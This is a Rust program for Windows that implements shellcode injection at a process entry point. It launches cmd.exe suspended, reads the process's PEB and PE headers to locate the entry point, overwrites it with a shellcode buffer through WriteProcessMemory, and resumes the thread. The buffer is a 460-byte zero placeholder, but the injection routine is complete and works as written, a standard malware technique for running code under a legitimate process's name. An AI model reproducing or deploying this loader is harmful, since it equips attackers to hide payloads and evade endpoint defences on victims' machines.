use std::{
    ffi::c_void,
    mem::{size_of, zeroed},
    ptr::{from_mut, null_mut},
};
#[cfg(any(target_arch = "x86", target_arch = "arm"))]
use windows::Win32::System::Diagnostics::Debug::IMAGE_NT_HEADERS32;
#[cfg(any(target_arch = "x86_64", target_arch = "aarch64"))]
use windows::Win32::System::Diagnostics::Debug::IMAGE_NT_HEADERS64;
use windows::{
    Wdk::System::Threading::{NtQueryInformationProcess, ProcessBasicInformation},
    Win32::{
        Foundation::{CloseHandle, GetLastError},
        System::{
            Diagnostics::Debug::{ReadProcessMemory, WriteProcessMemory},
            SystemServices::IMAGE_DOS_HEADER,
            Threading::{
                CREATE_SUSPENDED, CreateProcessW, PROCESS_BASIC_INFORMATION, PROCESS_INFORMATION,
                ResumeThread, STARTF_USESHOWWINDOW, STARTUPINFOW,
            },
        },
    },
    core::{Error, HRESULT, Result, w},
};

#[cfg(any(target_arch = "x86_64", target_arch = "aarch64"))]
type ImageNtHeaders = IMAGE_NT_HEADERS64;

#[cfg(any(target_arch = "x86", target_arch = "arm"))]
type ImageNtHeaders = IMAGE_NT_HEADERS32;

fn main() -> Result<()> {
    let shellcode: [u8; 460] = [0x00; 460];

    unsafe {
        let mut s_info = STARTUPINFOW::default();
        s_info.cb = size_of::<STARTUPINFOW>() as u32;
        s_info.dwFlags = STARTF_USESHOWWINDOW;

        let mut p_info = PROCESS_INFORMATION::default();

        CreateProcessW(
            w!("C:\\Windows\\System32\\cmd.exe"),
            None,
            None,
            None,
            false,
            CREATE_SUSPENDED,
            None,
            w!("C:\\Windows\\System32"),
            &s_info,
            &mut p_info,
        )?;

        let mut pb_info = PROCESS_BASIC_INFORMATION::default();
        let mut return_length = 0u32;

        let nt_query = NtQueryInformationProcess(
            p_info.hProcess,
            ProcessBasicInformation,
            from_mut(&mut pb_info).cast(),
            size_of::<PROCESS_BASIC_INFORMATION>() as u32,
            &mut return_length,
        );
        if nt_query.is_err() {
            CloseHandle(p_info.hThread)?;
            CloseHandle(p_info.hProcess)?;
            return Err(Error::from_hresult(HRESULT(GetLastError().0 as i32)));
        }

        let lp_base_address = (pb_info.PebBaseAddress as usize + 0x10) as *const c_void;

        let mut base_address: *mut c_void = null_mut();
        let mut bytes_read = 0usize;
        ReadProcessMemory(
            p_info.hProcess,
            lp_base_address,
            from_mut(&mut base_address).cast(),
            size_of::<usize>(),
            Some(&mut bytes_read),
        )?;

        let mut dos_header: IMAGE_DOS_HEADER = zeroed();
        ReadProcessMemory(
            p_info.hProcess,
            base_address,
            from_mut(&mut dos_header).cast(),
            size_of::<IMAGE_DOS_HEADER>(),
            Some(&mut bytes_read),
        )?;

        let lp_nt_header = (base_address as usize + dos_header.e_lfanew as usize) as *const c_void;
        let mut nt_headers: ImageNtHeaders = zeroed();
        ReadProcessMemory(
            p_info.hProcess,
            lp_nt_header,
            from_mut(&mut nt_headers).cast(),
            size_of::<ImageNtHeaders>(),
            Some(&mut bytes_read),
        )?;

        let entry_point = (base_address as usize
            + nt_headers.OptionalHeader.AddressOfEntryPoint as usize)
            as *mut core::ffi::c_void;
        let mut bytes_written: usize = 0;
        WriteProcessMemory(
            p_info.hProcess,
            entry_point,
            shellcode.as_ptr().cast(),
            shellcode.len(),
            Some(&mut bytes_written),
        )?;

        ResumeThread(p_info.hThread);

        CloseHandle(p_info.hThread)?;
        CloseHandle(p_info.hProcess)?;
    };

    Ok(())
}
